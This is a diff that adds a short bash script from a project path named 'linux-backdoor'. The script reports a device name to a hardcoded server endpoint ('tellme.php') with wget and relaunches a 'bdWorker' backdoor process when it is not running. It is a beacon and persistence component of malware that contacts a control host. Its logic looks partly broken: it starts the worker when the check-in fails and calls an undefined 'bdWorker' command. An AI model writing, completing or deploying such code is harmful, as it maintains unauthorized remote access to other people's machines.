@@ -1,0 +1,32 @@
+#!/bin/bash
+
+server="http://192.168.0.100/tyn/linux-backdoor/tellme.php"
+deviceName="test_server_with_python"
+getParam="?device_name=$deviceName"
+
+tellToServerIfOnline() {
+  wget --spider -q "$server$getParam"
+}
+
+ifBdWorkerIsNotRunning() {
+  if [ `ps aux | grep bdWorker.py -c` -lt 2 ]; then
+    bdWorker
+  fi
+}
+
+ifOnline() {
+  tellToServerIfOnline
+
+  if [ $? -gt 0 ]; then
+    ifBdWorkerIsNotRunning
+  else
+    exit 0
+  fi
+}
+
+fire() {
+  ifOnline
+}
+
+
+fire
